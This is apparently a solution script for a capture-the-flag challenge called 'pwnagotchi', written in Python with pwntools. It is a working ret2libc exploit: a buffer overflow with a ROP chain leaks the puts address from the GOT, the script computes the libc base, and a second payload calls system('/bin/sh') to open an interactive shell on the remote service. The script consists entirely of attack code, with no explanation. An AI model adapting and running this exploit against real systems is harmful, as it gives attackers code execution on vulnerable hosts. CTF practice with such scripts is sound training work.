from pwn import *

#context.log_level = 'DEBUG'
context=['tmux','new-window']

p= remote('pwn.hsctf.com',5005)
#p=process('./pwnagotchi')
elf=ELF('./pwnagotchi')
libc= ELF('libc6_2.27-3ubuntu1_amd64.so')
rop = ROP(elf)# Find ROP gadgets


#p= gdb.debug('./pwnagotchi')
RET = (rop.find_gadget(['ret']))[0]


p.recvuntil('Enter your pwnagotchi\'s name: \n')

junk  = 'A'*20

#zzz
ZZZ= 0x0000000000400801
EAT= 0x00000000004007e7

#rop
POP_RDI          = 0x00000000004009f3 
#writable_address = 0x0000000000601000
LIBC_START_MAIN = elf.symbols['__libc_start_main']
PUTS = elf.plt['puts']
GOT_PUTS = elf.got['puts']
MAIN = elf.sym['main']

#0x601018

log.info("puts@plt: " + hex(PUTS))
log.info("__libc_start_main: " + hex(LIBC_START_MAIN))
log.info("pop rdi gadget: " + hex(POP_RDI))
log.info("got puts: " + hex(GOT_PUTS))

payload = junk + p64(POP_RDI) + p64(GOT_PUTS) + p64(PUTS)+ p64(EAT) + p64(ZZZ) +p64(MAIN)

p.sendline(payload)

#leaking address of puts
p.recvline('is not happy!')

#print(leaked)
leak= u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
log.info("Leaked address of puts:%s"  % hex(leak))
libc_address = leak - libc.sym["puts"]
log.info("Address of libc %s " % hex(libc_address))



BINSH = next(libc.search("/bin/sh")) + libc_address#Verify with find /bin/sh libc6_2.27-3ubuntu1_amd64.so
SYSTEM = libc.sym["system"] + libc_address
log.info("bin/sh %s " % hex(BINSH))
log.info("system %s " % hex(SYSTEM))

#p.recvuntil('Enter your pwnagotchi\'s name: \n')                   
payload2 = junk + p64(RET)+ p64(POP_RDI) + p64(BINSH) + p64(SYSTEM)

p.sendline(payload2)
p.interactive()

